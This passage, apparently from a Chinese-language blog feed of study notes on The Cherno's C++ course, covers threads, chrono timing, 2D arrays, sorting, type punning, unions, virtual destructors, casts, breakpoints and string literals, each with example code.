class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;thread&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">bool</span> s_Finished = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DoWork</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">using</span> <span class="keyword">namespace</span> std::literals::chrono_literals;  <span class="comment">// 1s需要</span></span><br><span class="line"></span><br><span class="line">  std::cout &lt;&lt; <span class="string">&quot;Thread id = &quot;</span> &lt;&lt; std::this_thread::<span class="built_in">get_id</span>() &lt;&lt; std::endl;</span><br><span class="line">  <span class="keyword">while</span> (!s_Finished) &#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Working...&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    std::this_thread::<span class="built_in">sleep_for</span>(<span class="number">1</span>s);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="function">std::thread <span class="title">worker</span><span class="params">(DoWork)</span></span>;  <span class="comment">// 参数为 函数指针 和 函数参数</span></span><br><span class="line">  <span class="comment">// eg: std::thread second (bar,0);</span></span><br><span class="line"></span><br><span class="line">  std::cin.<span class="built_in">get</span>();</span><br><span class="line">  s_Finished = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">  worker.<span class="built_in">join</span>();  <span class="comment">// main线程阻塞，等待worker线程退出</span></span><br><span class="line"></span><br><span class="line">  std::cout &lt;&lt; <span class="string">&quot;Thread id = &quot;</span> &lt;&lt; std::this_thread::<span class="built_in">get_id</span>() &lt;&lt; std::endl;</span><br><span class="line">  std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="63-Timing-in-C">63 Timing in C++</h1><p>标准写法可参考<a href="https://www.notion.so/Cherno-17f2e807a69841bcb3e75063a6b2827d?pvs=21">74</a></p><p><strong>chrono是C++库的一部分（C++11）</strong>，不需要使用操作系统。在chrono之前，如果想要非常精确的计时器，需要使用操作系统库（Windows中，有QueryPerformanceCounter）。</p><p>chrono与平台无关，推荐使用（99%情况下使用chrono就好），除非正在做一些特定的底层的事情希望进一步减少开销，或者想要使用特定于平台的库。</p><p>std::endl 很慢，推荐换成 \n。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;chrono&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;thread&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">using</span> <span class="keyword">namespace</span> std::literals::chrono_literals;</span><br><span class="line"></span><br><span class="line">  std::chrono::time_point&lt;std::chrono::steady_clock&gt; start = std::chrono::high_resolution_clock::<span class="built_in">now</span>();</span><br><span class="line">  std::this_thread::<span class="built_in">sleep_for</span>(<span class="number">1</span>s);</span><br><span class="line">  <span class="keyword">auto</span> end = std::chrono::high_resolution_clock::<span class="built_in">now</span>();</span><br><span class="line"></span><br><span class="line">  std::chrono::duration&lt;<span class="type">float</span>&gt; duration;</span><br><span class="line">  duration = end - start;</span><br><span class="line">  std::cout &lt;&lt; duration.<span class="built_in">count</span>() &lt;&lt; <span class="string">&quot;s&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">  </span><br><span class="line">  std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>instrumentation（插码）</code>，可以使用插码来实际修改源代码，以包含某种分析工具。</p><p><strong>记时类</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;chrono&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;thread&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Timer</span> &#123;</span><br><span class="line">  std::chrono::time_point&lt;std::chrono::steady_clock&gt; start, end;</span><br><span class="line">  std::chrono::duration&lt;<span class="type">float</span>&gt; duration;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">Timer</span>() &#123;</span><br><span class="line">    start = std::chrono::high_resolution_clock::<span class="built_in">now</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ~<span class="built_in">Timer</span>() &#123;</span><br><span class="line">    end = std::chrono::high_resolution_clock::<span class="built_in">now</span>();</span><br><span class="line">    duration = end - start;</span><br><span class="line">    <span class="type">float</span> ms = duration.<span class="built_in">count</span>() * <span class="number">1000.0f</span>;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Timer took &quot;</span> &lt;&lt; ms &lt;&lt; <span class="string">&quot;ms\n&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  Timer timer;  <span class="comment">// 插码</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; ++i)</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Hello\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">Function</span>();</span><br><span class="line">  std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="64-Multidimensional-Arrays-in-C-2D-arrays">64 Multidimensional Arrays in C++ (2D arrays)</h1><p>在处理任何类型的数组时，指针都是重要的，因为数组就是内存块，处理内存简单的方式就是使用指针。</p><p>二维数组就是数组的数组，是数组的集合，int**就是指向int*数组的指针。</p><p>int** a2d = new int*[5] 所做的就是分<strong>配20byte的空间</strong>（32位），这个空间后续可以存放其他类型数据比如float。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 二维数组</span></span><br><span class="line">  <span class="type">int</span>** a2d = <span class="keyword">new</span> <span class="type">int</span>* [<span class="number">5</span>];  <span class="comment">// 为5个指针分配空间</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; ++i)</span><br><span class="line">    a2d[i] = <span class="keyword">new</span> <span class="type">int</span>[<span class="number">5</span>];  <span class="comment">// 为5*5个数据分配空间</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; ++i)</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">5</span>; ++j)</span><br><span class="line">      a2d[i][j] = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; ++i)</span><br><span class="line">    <span class="keyword">delete</span>[] a2d[i];</span><br><span class="line">  <span class="keyword">delete</span>[] a2d;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 一维等效写法</span></span><br><span class="line">  <span class="type">int</span>* a1d = <span class="keyword">new</span> <span class="type">int</span>[<span class="number">25</span>];</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; ++i)</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">5</span>; ++j)</span><br><span class="line">      a1d[i * <span class="number">5</span> + j] = <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">delete</span>[] a1d;</span><br><span class="line">  std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>堆分配方式，会被分配熬内存中完全随机的位置，可能很远——要访问全部数据，可能在访问一行数据后，要跳到其他维度，这会导致 <code>cache miss（缓存不命中）</code> ，这意味着我们在从ram中获取数据时浪费了时间。<br><strong>内存分配越分散性能越差</strong>。优化时尽量让访问的内存存储在一块，这样定位数据时会有更多的cache hits以及更少的cache miss。</p><h1 id="65-Sorting-in-C">65 Sorting in C++</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">std::vector&lt;<span class="type">int</span>&gt; values = &#123; <span class="number">3</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">2</span> &#125;;</span><br><span class="line">  std::<span class="built_in">sort</span>(values.<span class="built_in">begin</span>(), values.<span class="built_in">end</span>(), [](<span class="type">int</span> a, <span class="type">int</span> b) &#123;</span><br><span class="line">    <span class="keyword">if</span> (a == <span class="number">1</span>)  <span class="comment">// 确保1放在最后</span></span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (b == <span class="number">1</span>)  <span class="comment">// 应当这样设置</span></span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> a &lt; b;</span><br><span class="line"><span class="comment">// 函数返回值含义：a是否应当在b前面</span></span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><h1 id="66-Type-Punning-in-C">66 Type Punning in C++</h1><p><strong>类型双关</strong>只是一个花哨的术语，用来在C++中绕过类型系统。<br>C++是强类型语言，有类型系统。C++中虽然类型是由编译器强制执行的，但可以直接访问内存，这是一种原始的、底层的访问。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a = <span class="number">50</span>;</span><br><span class="line"><span class="type">double</span> value = a;  <span class="comment">// 隐式转换，等价于double value = (double)a;</span></span><br><span class="line">std::cout &lt;&lt; value &lt;&lt; std::endl;  <span class="comment">// 50</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// a的内存为0x32</span></span><br><span class="line"><span class="comment">// b的内存为0x404900 00000000</span></span><br></pre></td></tr></table></figure><p>类型双关：<code>double value = **(double**)&amp;a;</code> 取a的地址转换为double*指针，然后再解引用。这样处理会把a后面4字节的内存也复制过来。<br>PS：使用引用则为<code>double&amp; value = *(double*)&amp;a;</code></p><p>理解：<strong>把目标内存当作不同类型的内存来对待。我们所需要做的只是将该类型作为指针，然后将其转换为另一个指针，如果由必要还可以进行解引用。</strong></p><p>结构体（类）本身不包含任何数据的填充。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Entity</span> &#123;</span><br><span class="line">  <span class="type">int</span> x, y;</span><br><span class="line"><span class="function"><span class="type">int</span>* <span class="title">GetPositions</span><span class="params">()</span> </span>&#123;  <span class="comment">// 让x,y作为数组返回，重新建数组太慢了</span></span><br><span class="line"><span class="keyword">return</span> &amp;x;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  Entity e = &#123; <span class="number">5</span>, <span class="number">8</span> &#125;;</span><br><span class="line">  <span class="type">int</span>* position = (<span class="type">int</span>*)&amp;e;</span><br><span class="line">  std::cout &lt;&lt; position[<span class="number">0</span>] &lt;&lt; <span class="string">&quot;, &quot;</span> &lt;&lt; position[<span class="number">1</span>] &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> y = *(<span class="type">int</span>*)((<span class="type">char</span>*)&amp;e + <span class="number">4</span>);  <span class="comment">// 实际中千万不要这样写</span></span><br><span class="line">  std::cout &lt;&lt; y &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span>* a = e.<span class="built_in">GetPositions</span>();</span><br><span class="line">  a[<span class="number">1</span>] = <span class="number">-1</span>;</span><br><span class="line">  std::cout &lt;&lt; e.x &lt;&lt; <span class="string">&quot;, &quot;</span> &lt;&lt; e.y &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">  std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="67-Unions-in-C">67 Unions in C++</h1><p>联合体有点像类类型或结构体类型，只不<strong>过它一次只能占用一个成员的内存。类中各个成员共享内存</strong>，将a的值修改为5则d的值也会修改为5。</p><p>可以像使用结构体和类一样使用联合体，可以给它添加静态函数或普通函数、方法等。<strong>然而，不能使用虚函数，还有其他一些限制。</strong></p><p>通常人们用联合体来做的事是和<strong>类型双关</strong>紧密相关的。<br>当想给同一个变量取两个不同的名字时，或<strong>想用多种方法来处理相同的数据</strong>时，联合体很有用。</p><p>通常union是匿名使用的，但是匿名union不能含有成员函数。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Vector2</span> &#123;</span><br><span class="line">  <span class="type">float</span> x, y;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Vector4</span> &#123;</span><br><span class="line">  <span class="keyword">union</span> &#123;</span><br><span class="line">    <span class="keyword">struct</span> &#123;</span><br><span class="line">      <span class="type">float</span> x, y, z, w;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">struct</span> &#123;</span><br><span class="line">      Vector2 a, b;</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">PrintVector2</span><span class="params">(Vector2 v)</span> </span>&#123;</span><br><span class="line">  std::cout &lt;&lt; v.x &lt;&lt; <span class="string">&quot;, &quot;</span> &lt;&lt; v.y &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  Vector4 vector = &#123; <span class="number">1.0f</span>, <span class="number">2.0f</span>, <span class="number">3.0f</span>, <span class="number">4.0f</span> &#125;;</span><br><span class="line">  <span class="built_in">PrintVector2</span>(vector.a);</span><br><span class="line">  vector.z = <span class="number">100.0f</span>;</span><br><span class="line">  <span class="built_in">PrintVector2</span>(vector.b);</span><br><span class="line">  std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="68-Virtual-Destructors-in-C">68 Virtual Destructors in C++</h1><p>虚析构函数就是<strong>虚函数</strong>和<strong>析构函数</strong>的组合。虚析构函数对于处理多态非常重要。</p><p>在普通方法前标记为virtual，那么它就可以被覆写，这意味着虚函数表要做这样的设置。<br>虚析构函数有点不同，虚析构函数<strong>不是要覆写析构函数，而是加上一个析构函数</strong>。</p><blockquote><p>💡 <strong>只要允许一个类拥有子类，百分百需要声明析构函数是虚函数</strong>，否则没人能安全地扩展此类。</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Base</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="built_in">Base</span>() &#123; std::cout &lt;&lt; <span class="string">&quot;Base Constructor\n&quot;</span>; &#125;</span><br><span class="line">  ~<span class="built_in">Base</span>() &#123; std::cout &lt;&lt; <span class="string">&quot;Base Destructor\n&quot;</span>; &#125;  <span class="comment">// 加virtual后第3种情况与2同</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Derived</span> : <span class="keyword">public</span> Base &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="built_in">Derived</span>() &#123; std::cout &lt;&lt; <span class="string">&quot;Derived Constructor\n&quot;</span>; &#125;</span><br><span class="line">  ~<span class="built_in">Derived</span>() &#123; std::cout &lt;&lt; <span class="string">&quot;Derived Destructor\n&quot;</span>; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  Base* base = <span class="keyword">new</span> <span class="built_in">Base</span>();</span><br><span class="line">  <span class="keyword">delete</span> base;</span><br><span class="line">  std::cout &lt;&lt; <span class="string">&quot;----------------\n&quot;</span>;</span><br><span class="line">  Derived* derived = <span class="keyword">new</span> <span class="built_in">Derived</span>();</span><br><span class="line">  <span class="keyword">delete</span> derived;</span><br><span class="line">  std::cout &lt;&lt; <span class="string">&quot;----------------\n&quot;</span>;</span><br><span class="line">  Base* poly = <span class="keyword">new</span> <span class="built_in">Derived</span>();</span><br><span class="line">  <span class="keyword">delete</span> poly;</span><br><span class="line">  std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Out</span></span><br><span class="line">Base Constructor</span><br><span class="line">Base Destructor</span><br><span class="line">----------------</span><br><span class="line">Base Constructor</span><br><span class="line">Derived Constructor</span><br><span class="line">Derived Destructor</span><br><span class="line">Base Destructor</span><br><span class="line">----------------</span><br><span class="line">Base Constructor</span><br><span class="line">Derived Constructor</span><br><span class="line">Base Destructor</span><br></pre></td></tr></table></figure><p>注意：正常情况下，创建子类对象时，<strong>会先调用父类构造函数，再调用子类构造函数。</strong><br>删除子类对象时，会先调用子类析构函数，再调用父类析构函数。</p><h1 id="69-Casting-in-C">69 Casting in C++</h1><p>本节需要练习并通过经验来学习，而不是告诉它如何运作。这个话题上若只使用理论而没有实践，则不会有多大帮助。</p><p><code>(int)value</code> 是 C语言风格类型转换。圆括号中指定了要强制转换的类型，然后是我们要强制转换的变量，变量可用括号括起来。</p><p>C++风格类型转换共有4中主要的cast，它们<strong>不能做任何C风格类型转换所不能处理的事情</strong>。这不是添加新功能，只是添加一些语法糖（dynamic_cast会做运行时检查，其他的会做编译时检查）。</p><ul><li><strong>static_cast</strong> 用于进行比较“自然”和低风险的转换，如整型和浮点型、字符型之间的互相转换**，不能用于指针类型的强制转换。**</li><li><strong>reinterpret_cast</strong> 用于进行各种<strong>不同类型的指针之间强制转换</strong>，把<strong>目标内存重新解释成别的东西</strong><br><code>double s = reinterpret_cast&lt;AnotherClass*&gt;(&amp;value)  + 5.3;</code> 。</li><li><strong>const_cast</strong> 用于进行<strong>去除</strong> const 属性的转换。</li><li><strong>dynamic_cast</strong> 不检查转换安全性，<strong>仅运行时检查（与运行时状态信息RTTI紧密相关）</strong>，如果不能转换，返回null。</li></ul><p>搞这么多cast的好处：除了可能收到检查外，还可以在代码库中搜索它们。</p><h1 id="70-Conditional-and-Action-Breakpoints-in-C">70 Conditional and Action Breakpoints in C++</h1><p>普通断点的缺点：需要<strong>停止应用程序，然后重新编译；有时还很难复现bug状态</strong>。</p><p><strong>条件断点</strong>：可以告诉调试器，我想在此放置一个断点，但我只希望断点在特定条件下触发。</p><p><strong>操作断点</strong>：允许我们采取某种动作，一般是在碰到断点时打印一些东西到控制台。</p><p>右键断点，选择选择”条件“或者”操作“，”操作”中还能取消勾选“继续执行”。</p>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
          <category> Cherno </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Cherno笔记(31-50)</title>
      <link href="/2023/04/07/C-Cherno-Cherno%E7%AC%94%E8%AE%B0-31-50/"/>
      <url>/2023/04/07/C-Cherno-Cherno%E7%AC%94%E8%AE%B0-31-50/</url>
      
        <content type="html"><![CDATA[<p>课程地址：<a href="https://www.youtube.com/watch?v=18c3MTX0PK0&amp;list=PLlrATfBNZ98dudnM48yfGUldqGD0S4FFb&amp;index=1">Youtube上TheCherno上传的视频</a><br>翻译：<a href="https://www.bilibili.com/video/BV1uy4y167h2/?spm_id_from=333.788&amp;vd_source=0d3fa48307c38b76dfdfa60ed4b44b42">神经元猫的高质量翻译</a></p><h1 id="31-How-Strings-Work-in-C-and-how-to-use-them">31 How Strings Work in C++ (and how to use them)</h1><p>新的C++标准舍弃了C风格的字符串：<code>const char* name = “JKA”</code> （不知道，反正VS2022还能用）。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span>* name = <span class="string">&quot;JKA&quot;</span>;  <span class="comment">// vs2017后&quot;const char*&quot;类型值不能用于初始化化&quot;char*&quot;</span></span><br><span class="line">  std::cout &lt;&lt; name &lt;&lt; std::endl;</span><br><span class="line">  </span><br><span class="line">  <span class="type">int</span> big = <span class="number">9</span>;  <span class="comment">// 栈内存守卫，后面也会加上cc字节</span></span><br><span class="line">  <span class="type">char</span> name2[<span class="number">3</span>] = &#123; <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;A&#x27;</span> &#125;;</span><br><span class="line">  <span class="comment">//char name2[4] = &#123; &#x27;J&#x27;, &#x27;K&#x27;, &#x27;A&#x27;, 0 &#125;;</span></span><br><span class="line">  std::cout &lt;&lt; name2 &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">  std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line">JKA</span><br><span class="line">JKA烫烫烫烫?</span><br></pre></td></tr></table></figure><p>在C++中，使用双引号引起来的值是<code>const char*</code>类型的。</p><p>从右往左看，const和char靠的更近，表示指向内容不可改变，但指针可以重新赋值，这属于<strong>底层const</strong>。</p><p><strong>C++中string</strong></p><p>实际上有一个BasicString模版类，std::string是BasicString类的模版特化版本——将BasicString模版类中的模版参数设置为char，这叫<code>模版特化（template specialization）</code> 。</p><p>把类（对象）传给一个函数时，实际在进行复制：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span>  <span class="comment">// 虽然包含 &lt;iostream&gt; 后能使用 std::string 应该是确定的，不过不一定等价于包含 &lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">//std::string name = &quot;Hello&quot; + &quot; JKA&quot;;  // const char* 数组没有加法</span></span><br><span class="line">  std::string name = std::<span class="built_in">string</span>(<span class="string">&quot;Hello &quot;</span>) + <span class="string">&quot;JKA&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> (name.<span class="built_in">find</span>(<span class="string">&quot;JK&quot;</span>) == std::string::npos) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  std::cout &lt;&lt; name &lt;&lt; std::endl;</span><br><span class="line">  std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="32-String-Literals-in-C">32 String Literals in C++</h1><p>字符串字面量 是在双引号之前的一串字符。</p><p>字符串字面量永远是存储在内存的.rodata部分，不能修改（右值），否则为未定义行为，可能无法编译/编译报错/运行时发现字符串并为被修改。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="comment">// #include &lt;string&gt;  // 虽包含 &lt;iostream&gt; 后能使用 std::string，但不等价于包含 &lt;string&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> name[<span 